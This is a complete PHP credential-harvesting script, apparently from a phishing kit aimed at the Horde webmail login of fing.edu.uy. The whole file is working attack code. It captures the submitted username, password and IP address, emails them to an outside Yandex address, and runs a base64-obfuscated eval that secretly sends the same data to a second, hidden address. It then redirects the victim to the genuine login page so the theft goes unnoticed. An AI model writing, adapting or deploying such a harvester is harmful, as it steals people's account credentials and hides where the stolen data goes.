<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['horde_user'];
$sUPass = $_POST['horde_pass'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (JP-Hack | fing.edu.uy |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://www.fing.edu.uy/horde/login.php \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://www.fing.edu.uy/horde/login.php\">");
exit();

?>